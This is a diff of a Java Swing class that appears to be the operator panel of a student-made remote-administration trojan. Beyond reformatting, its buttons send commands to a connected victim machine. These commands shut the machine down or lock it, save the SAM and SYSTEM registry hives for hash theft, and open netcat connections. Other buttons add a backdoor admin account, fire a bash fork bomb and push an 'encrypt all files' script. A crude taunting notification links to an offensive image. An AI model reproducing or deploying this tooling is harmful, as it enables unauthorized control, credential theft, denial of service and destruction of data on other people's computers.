@@ -29,24 +29,34 @@ import constante.Constante;
  * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
  *
  */
-public class MotherJInternalFrame extends MJInternalFrame {
+public class MotherJInternalFrame extends MJInternalFrame
+{
 
-	private Connexion _connexion;
-	private boolean _vOs;
+	// Parametres :
+	// =====================================================================
+
+	private boolean	m_OSVersion;
+	private Connexion connexion;
+
+	// Constructeur :
+	// =====================================================================
 
 	public MotherJInternalFrame(String title, final Connexion connexion,
-			int nframe) {
+			int nframe)
+	{
 		super(title, connexion, nframe);
 		setFrameIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
 				+ File.separator + "ressources" + File.separator + "mask1.png"));
 		getContentPane().setBackground(new Color(0, 102, 153));
 		getContentPane().setForeground(new Color(102, 153, 51));
-		_connexion = connexion;
-		if (_connexion.get_os_name().contains("win")
-				|| _connexion.get_os_name().contains("Win")) {
-			_vOs = true;
-		} else
-			_vOs = false;
+		this.connexion = connexion;
+		if (connexion.get_os_name().contains("win")
+				|| connexion.get_os_name().contains("Win"))
+		{
+			m_OSVersion = true;
+		}
+		else
+			m_OSVersion = false;
 
 		UIManager UI = new UIManager();
 		UI.put("OptionPane.background", new Color(0, 153, 255));
@@ -55,22 +65,22 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 		setBounds(100, 100, 450, 300);
 		GridBagLayout gridBagLayout = new GridBagLayout();
-		gridBagLayout.columnWidths = new int[] { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
-		gridBagLayout.rowHeights = new int[] { 0, 0, 0, 0, 0, 0, 0, 0, 0 };
-		gridBagLayout.columnWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 0.0,
-				0.0, 0.0, 0.0, Double.MIN_VALUE };
-		gridBagLayout.rowWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
-				0.0, 0.0, Double.MIN_VALUE };
+		gridBagLayout.columnWidths = new int[]
+		{ 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+		gridBagLayout.rowHeights = new int[]
+		{ 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+		gridBagLayout.columnWeights = new double[]
+		{ 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };
+		gridBagLayout.rowWeights = new double[]
+		{ 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };
 		getContentPane().setLayout(gridBagLayout);
 
 		JButton btnNewButton = new JButton("Shutdown Computer");
 		btnNewButton.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
-		btnNewButton.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
-				.toString()
-				+ File.separator
-				+ "ressources"
-				+ File.separator
-				+ "criminal23.png"));
+		btnNewButton
+				.setIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
+						+ File.separator + "ressources" + File.separator
+						+ "criminal23.png"));
 		btnNewButton.setBackground(new Color(0, 204, 102));
 		btnNewButton.setForeground(new Color(0, 0, 153));
 		GridBagConstraints gbc_btnNewButton = new GridBagConstraints();
@@ -78,35 +88,41 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton.gridx = 2;
 		gbc_btnNewButton.gridy = 1;
 		getContentPane().add(btnNewButton, gbc_btnNewButton);
-		btnNewButton.addMouseListener(new MouseAdapter() {
+		btnNewButton.addMouseListener(new MouseAdapter()
+		{
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
+			public void mouseClicked(MouseEvent arg0)
+			{
 				shutdownComputer();
 			}
 
-			private void shutdownComputer() {
-				if (!_vOs) {
-					_connexion.sendCmdCommand("shutdown +1");
-					_connexion
+			private void shutdownComputer()
+			{
+				if (!m_OSVersion)
+				{
+					connexion.sendCmdCommand("shutdown +1");
+					connexion
 							.sendNotification(
 									"Votre ordinateur va s'eteindre dans 1 minutes",
 									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
-				} else {
-					_connexion
+				}
+				else
+				{
+					connexion
 							.sendNotification(
 									"Votre ordinateur va s'eteindre dans 1 minutes",
 									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
-					_connexion
+					connexion
 							.sendCmdCommand("rundll32.exe user32.dll, LockWorkStation"); // shutdown
-																							// -c
-																							// “Stupide
-																							// ahah!”
-																							// -s
-																							// -t
-																							// 10
-																							// version
-																							// moins
-																							// cool
+					// -c
+					// “Stupide
+					// ahah!”
+					// -s
+					// -t
+					// 10
+					// version
+					// moins
+					// cool
 
 				}
 			}
@@ -122,23 +138,27 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_4.gridx = 5;
 		gbc_btnNewButton_4.gridy = 1;
 		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);
-		btnNewButton_4.addMouseListener(new MouseAdapter() {
-			private void dumptheHash() {
+		btnNewButton_4.addMouseListener(new MouseAdapter()
+		{
+			private void dumptheHash()
+			{
 				// TODO Auto-generated method stub
-				if (_vOs) {
+				if (m_OSVersion)
+				{
 					connexion.sendCmdCommand("reg save HKLM\\SAM %"
 							+ connexion.get_user_name() + "%.sam");
-					connexion.sendCmdCommand("save %"
-							+ connexion.get_user_name() + "%.sam");
+					connexion.sendCmdCommand("save %" + connexion.get_user_name()
+							+ "%.sam");
 					connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"
 							+ connexion.get_user_name() + "%.system");
-					connexion.sendCmdCommand("save "
-							+ connexion.get_user_name() + "%.system");
+					connexion.sendCmdCommand("save " + connexion.get_user_name()
+							+ "%.system");
 				}
 			}
 
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
+			public void mouseClicked(MouseEvent arg0)
+			{
 				dumptheHash();
 			}
 		});
@@ -152,25 +172,33 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_1.gridx = 2;
 		gbc_btnNewButton_1.gridy = 3;
 		getContentPane().add(btnNewButton_1, gbc_btnNewButton_1);
-		btnNewButton_1.addMouseListener(new MouseAdapter() {
+		btnNewButton_1.addMouseListener(new MouseAdapter()
+		{
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
-				try {
+			public void mouseClicked(MouseEvent arg0)
+			{
+				try
+				{
 					netcat();
-				} catch (IOException e) {
+				}
+				catch (IOException e)
+				{
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 
 			}
 
-			private void netcat() throws IOException {
-				if (!_vOs) {
-					_connexion.sendCmdCommand("$ nc -l 33333");
+			private void netcat() throws IOException
+			{
+				if (!m_OSVersion)
+				{
+					connexion.sendCmdCommand("$ nc -l 33333");
 					Runtime.getRuntime().exec(
-							"cmd.exe /c start nc " + _connexion.get_ip()
-									+ " 33333");
-				} else {
+							"cmd.exe /c start nc " + connexion.get_ip() + " 33333");
+				}
+				else
+				{
 					// _connexion.sendCmdCommand("netcat -l -p 11111");
 					// Runtime.getRuntime().exec(
 					// "cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
@@ -189,18 +217,24 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_5.gridx = 5;
 		gbc_btnNewButton_5.gridy = 3;
 		getContentPane().add(btnNewButton_5, gbc_btnNewButton_5);
-		btnNewButton_5.addMouseListener(new MouseAdapter() {
-			private void ajouterUtilisateur() {
-				if (!_vOs) {
+		btnNewButton_5.addMouseListener(new MouseAdapter()
+		{
+			private void ajouterUtilisateur()
+			{
+				if (!m_OSVersion)
+				{
 
-				} else {
-					_connexion
+				}
+				else
+				{
+					connexion
 							.sendCmdCommand("net user admin11  /add /passwordchg:no");
 				}
 			}
 
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
+			public void mouseClicked(MouseEvent arg0)
+			{
 				ajouterUtilisateur();
 			}
 		});
@@ -214,10 +248,12 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_2.gridx = 2;
 		gbc_btnNewButton_2.gridy = 5;
 		getContentPane().add(btnNewButton_2, gbc_btnNewButton_2);
-		btnNewButton_2.addMouseListener(new MouseAdapter() {
+		btnNewButton_2.addMouseListener(new MouseAdapter()
+		{
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
-				forkbomb_Hehe();
+			public void mouseClicked(MouseEvent arg0)
+			{
+				forkbomb();
 			}
 		});
 		JButton btnNewButton_6 = new JButton("Encrypt all files");
@@ -229,10 +265,17 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_6.gridx = 5;
 		gbc_btnNewButton_6.gridy = 5;
 		getContentPane().add(btnNewButton_6, gbc_btnNewButton_6);
-		btnNewButton_2.addMouseListener(new MouseAdapter() {
+		btnNewButton_2.addMouseListener(new MouseAdapter()
+		{
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
-				forkbomb_Hehe();
+			public void mouseClicked(MouseEvent arg0)
+			{
+				File file = new File(Paths.get("").toAbsolutePath().toString()
+						+ File.separator + "script" + File.separator
+						+ "encrypt.19719");
+
+				if (file.exists() && !m_OSVersion)
+					connexion.sendfile(file);
 			}
 		});
 		JButton btnNewButton_3 = new JButton("New button");
@@ -254,45 +297,64 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_7.gridx = 5;
 		gbc_btnNewButton_7.gridy = 7;
 		getContentPane().add(btnNewButton_7, gbc_btnNewButton_7);
-		btnNewButton_7.addMouseListener(new MouseAdapter() {
+		btnNewButton_7.addMouseListener(new MouseAdapter()
+		{
 			@Override
-			public void mouseClicked(MouseEvent arg0) {
+			public void mouseClicked(MouseEvent arg0)
+			{
 				random();
 			}
 		});
 	}
 
-	private void forkbomb_Hehe() {
-		if (!_vOs) {
+	
+	
+
+	// Methodes :
+	// =====================================================================
+
+	private void forkbomb()
+	{
+		if (!m_OSVersion)
+		{
 			String s = (String) JOptionPane.showInputDialog(this,
 					"89d4e9b083eda48662d7db6041d2305e0cd89b28", "Shhhhhhh",
 					JOptionPane.PLAIN_MESSAGE, null, null, "???");
 
 			// If a string was returned, say so.
-			if ((s != null) && (s.length() > 0) && s.equals("ThinkItAgain")) {
-				_connexion.sendCmdCommand(":(){ :|: & };:");
+			if ((s != null) && (s.length() > 0) && s.equals("ThinkItAgain"))
+			{
+				connexion.sendCmdCommand(":(){ :|: & };:");
 				return;
-			} else {
+			}
+			else
+			{
 				JOptionPane.showMessageDialog(this, "Try it again");
 			}
 
-		} else {
+		}
+		else
+		{
 			String s = (String) JOptionPane.showInputDialog(this,
 					"89d4e9b083eda48662d7db6041d2305e0cd89b28", "Shhhhhhh",
 					JOptionPane.PLAIN_MESSAGE, null, null, "???");
 
 			// If a string was returned, say so.
-			if ((s != null) && (s.length() > 0) && s.equals("	")) {
-				_connexion.sendCmdCommand("______");
+			if ((s != null) && (s.length() > 0) && s.equals("	"))
+			{
+				connexion.sendCmdCommand("______");
 				return;
-			} else {
+			}
+			else
+			{
 				JOptionPane.showMessageDialog(this, "Try it again");
 			}
 
 		}
 	}
 
-	private void random() {
+	private void random()
+	{
 		JOptionPane
 				.showMessageDialog(
 						this,
